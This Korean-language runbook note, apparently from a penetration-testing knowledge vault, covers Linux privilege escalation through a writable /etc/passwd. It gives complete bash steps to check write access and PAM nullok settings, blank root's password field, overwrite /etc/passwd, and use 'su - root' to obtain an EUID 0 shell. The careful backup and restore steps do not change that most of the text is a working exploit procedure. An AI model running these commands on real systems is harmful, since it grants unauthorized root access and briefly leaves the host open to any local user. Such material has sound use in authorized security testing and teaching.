---
tags:
  - 환경/linux
문서역할: 수동절차
시작조건: ["대상 Linux 호스트의 일반 사용자 셸", "/etc/passwd를 현재 사용자로 수정 가능"]
필요권한: ["/etc/passwd 내용 쓰기 권한"]
필요조건: ["root 행이 정확히 하나", "빈 비밀번호를 허용할 수 있는 인증 경로", "동시 변경을 막을 기준 hash와 복구 사본"]
결과: ["EUID 0 root 셸 또는 인증 거부", "/etc/passwd 원본 복구 상태"]
---

# 쓰기 가능한 passwd 빈 비밀번호 권한 상승

## 한 줄 판단

현재 Linux 사용자가 `/etc/passwd`를 직접 수정할 수 있고 대상 인증 경로가 빈 비밀번호를 허용할 가능성이 있으면, root 행의 password 필드만 짧게 비운 뒤 `su` 결과를 확인하고 성공 여부와 관계없이 동시 변경 guard를 거쳐 원래 파일 내용으로 즉시 복구한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 실행 위치와 계정 | 대상 Linux 호스트의 일반 사용자 셸 | `hostname`, `id` | 다른 host·container·namespace이면 대상과 파일을 다시 확인 |
| 쓰기 권한 | 현재 process가 기존 `/etc/passwd` 내용을 바꿀 수 있음 | `test -r /etc/passwd && test -w /etc/passwd` | 읽기·쓰기 중 어느 단계가 거부되는지 확인하고 다른 상승 경로 선택 |
| 파일 구조 | root 행 하나와 7개 필드, 현재 `x` 또는 기존 password 값 | `grep '^root:'`, `awk -F:` | root 행이 없거나 중복·형식 오류면 수정하지 않음 |
| 인증 경로 | `su`의 PAM stack이 빈 password를 허용할 가능성 | `/etc/pam.d/su`와 include된 auth stack에서 `pam_unix.so`의 `nullok`·`nonull` 확인 | 설정이 불명확하면 성공을 전제하지 않고 변경 창을 최소화 |
| 복구 입력 | 원본 내용·hash·owner·mode·mtime과 새 작업 디렉터리 | `sha256sum`, `stat`, 새 `mktemp -d` | 기준선과 exact 사본이 없으면 수정하지 않음 |

`passwd(5)`의 빈 password 필드는 비밀번호 없는 로그인을 나타내지만, `pam_unix`는 기본적으로 빈 비밀번호를 거부하고 `nullok` 같은 서비스별 설정이 있어야 허용할 수 있다. 따라서 writable 파일은 고영향 상승 후보지만 `su` 성공 자체는 변경 전 확정할 수 없다.

## 실행

### 1. 원본과 수정 후보를 별도 경로에 준비

대상 Linux 셸에서 실행한다. 작업 경로와 hash는 Vault가 아닌 현재 작업 기록에 남긴다.

```bash
hostname
id
test -r /etc/passwd && test -w /etc/passwd
test -f /etc/passwd && test ! -L /etc/passwd
grep '^root:' /etc/passwd
awk -F: 'NF != 7 { bad++ } $1 == "root" { root_count++ } END { exit bad != 0 || root_count != 1 }' /etc/passwd
grep -RnsE '^[[:space:]]*auth.*pam_unix\.so.*(nullok|nonull)' /etc/pam.d/su /etc/pam.d/common-auth /etc/pam.d/system-auth 2>/dev/null
```

PAM 검색 결과가 없거나 include 관계가 복잡하면 빈 비밀번호 거부로 확정하지 않는다. 실제 수락 여부는 `su` 단계의 별도 결과다.

```bash
umask 077
PASSWD_WORKDIR=$(mktemp -d /tmp/passwd-restore.XXXXXX)
cp -- /etc/passwd "$PASSWD_WORKDIR/passwd.before"
PASSWD_BEFORE_SHA256=$(sha256sum /etc/passwd | awk '{print $1}')
stat -c '%n %U:%G %a %s %y' /etc/passwd
printf 'workdir=%s\nbefore_sha256=%s\n' "$PASSWD_WORKDIR" "$PASSWD_BEFORE_SHA256"

awk -F: 'BEGIN { OFS=FS } $1 == "root" { $2=""; root_count++ } { print } END { if (root_count != 1) exit 42 }' \
  /etc/passwd > "$PASSWD_WORKDIR/passwd.modified"
awk -F: 'NF != 7 { bad++ } $1 == "root" { root_count++; if ($2 != "") bad++ } END { exit bad != 0 || root_count != 1 }' \
  "$PASSWD_WORKDIR/passwd.modified"
PASSWD_MODIFIED_SHA256=$(sha256sum "$PASSWD_WORKDIR/passwd.modified" | awk '{print $1}')
printf 'modified_sha256=%s\n' "$PASSWD_MODIFIED_SHA256"
```

확인할 출력:

- regular file로 확인된 작업 전 root 행, `/etc/passwd` owner·mode·mtime, `<PASSWD_BEFORE_SHA256>`, 새 `<PASSWD_WORKDIR>`와 `<PASSWD_MODIFIED_SHA256>`.
- `passwd.modified`는 root 행의 두 번째 필드만 빈 값이고 나머지 행·필드가 보존되어야 한다.
- `awk`가 42 또는 nonzero로 끝나면 원본에 쓰지 않고 후보 파일을 확인한다.

### 2. 동시 변경 guard 뒤 짧게 적용

현재 `/etc/passwd` hash가 기준선과 같을 때만 기존 파일 내용을 덮어쓴다. parent directory의 다른 파일이나 `/etc/shadow`는 수정하지 않는다.

```bash
test "$(sha256sum /etc/passwd | awk '{print $1}')" = "$PASSWD_BEFORE_SHA256" || exit 1
cp -- "$PASSWD_WORKDIR/passwd.modified" /etc/passwd
test "$(sha256sum /etc/passwd | awk '{print $1}')" = "$PASSWD_MODIFIED_SHA256"
grep '^root:' /etc/passwd
stat -c '%n %U:%G %a %s %y' /etc/passwd
```

hash가 이미 달라졌으면 계정 추가·비밀번호 변경 같은 동시 작업일 수 있다. 자동으로 덮어쓰지 말고 원본·현재 파일을 비교한 뒤 중단한다.

### 3. `su` 수락과 실제 EUID 확인

원래 일반 사용자 셸을 복구용으로 유지한 채 별도 terminal 또는 같은 셸에서 실행한다.

```bash
su - root
```

새 셸이 열렸을 때만 다음을 실행한다.

```bash
id -u
id
```

확인할 출력:

- `id -u`가 `0`이어야 root 실행 컨텍스트를 확인한 것이다.
- password prompt·`Authentication failure`·PAM 오류는 빈 password가 해당 `su` 경로에서 수락되지 않은 결과다. prompt에서 임의 비밀번호를 반복하지 않고 즉시 복구한다.
- 빈 root 행 자체는 root 셸, SSH 로그인 또는 다른 서비스 인증 성공이 아니다.

## 변경 영향과 복구

빈 root password 필드가 적용된 동안 다른 local 인증 주체도 이를 악용할 수 있고 계정 관리 도구와 서비스 동작에 영향을 줄 수 있다. 성공했으면 새 root 셸에서, 실패했으면 유지한 원래 셸에서 즉시 복구한다. 현재 hash가 작업에서 쓴 `<PASSWD_MODIFIED_SHA256>`와 같을 때만 전체 원본 사본을 되쓴다.

```bash
test "$(sha256sum /etc/passwd | awk '{print $1}')" = '<PASSWD_MODIFIED_SHA256>' || exit 1
cp -- '<PASSWD_WORKDIR>/passwd.before' /etc/passwd
test "$(sha256sum /etc/passwd | awk '{print $1}')" = '<PASSWD_BEFORE_SHA256>'
grep '^root:' /etc/passwd
stat -c '%n %U:%G %a %s %y' /etc/passwd
pwck -r
```

- hash와 root 행, owner·mode가 기준선과 같고 `pwck -r`에서 이번 변경으로 생긴 형식 오류가 없어야 파일 복구 완료다. 기존 mtime은 내용 복구 뒤 달라질 수 있으므로 원래 값으로 임의 조작하지 않고 변경 이력의 잔여 영향으로 기록한다.
- 현재 hash가 `<PASSWD_MODIFIED_SHA256>`와 다르면 다른 변경을 덮어쓰지 않는다. root 셸을 확보했다면 `diff -u '<PASSWD_WORKDIR>/passwd.before' /etc/passwd`로 차이를 확인하고 `vipw`에서 root 행의 원래 password 필드만 병합한 뒤 `pwck -r`로 검증한다. 자동 전체 복구는 미완료로 기록한다.
- root 셸을 사용한 작업을 마친 뒤 `exit`하고 실제 EUID가 원래 사용자로 돌아왔는지 확인한다. `/etc/passwd` 변경과 `su` 시도는 audit·authentication log에 남을 수 있으며 이를 삭제해 원상복구했다고 표현하지 않는다.

파일 복구를 확인한 뒤 이번 작업 디렉터리의 exact 파일만 제거한다.

```bash
rm -- '<PASSWD_WORKDIR>/passwd.modified' '<PASSWD_WORKDIR>/passwd.before'
rmdir -- '<PASSWD_WORKDIR>'
test ! -e '<PASSWD_WORKDIR>'
```

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `/etc/passwd`는 writable이지만 PAM이 빈 password를 거부 | 구성 오류는 있으나 이 `su` 경로의 상승 실패 | 일반 Linux 셸 유지 | 즉시 원본 복구 후 다른 Linux 권한 상승 후보 선택 |
| `su` 뒤 `id -u`가 `0` | 로컬 root 셸 획득 | 고권한 Linux 세션 | 먼저 `/etc/passwd`를 복구하고 [[고권한 세션 확보 후 후속 판단]] |
| 원본 hash와 root 행이 복원됨 | 파일 내용 복구 완료 | root 셸 성공 여부와 별도인 복구 완료 | 작업 디렉터리 정리와 log 잔여 영향 기록 |
| 복구 전 hash가 예상 수정본과 다름 | 동시 변경 가능성 | 자동 복구 중단 | root 행만 수동 병합하고 완료 전까지 복구 미확인으로 유지 |

## 관련 상태 라우터

- [[Linux 셸 확보 후 초기 열거와 권한 상승]]
- [[고권한 세션 확보 후 후속 판단]]

## 참고 링크

- [Linux passwd(5)](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [Linux-PAM pam_unix(8)](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [shadow-utils vipw(8)](https://man7.org/linux/man-pages/man8/vipw.8.html)
- [shadow-utils pwck(8)](https://man7.org/linux/man-pages/man8/pwck.8.html)
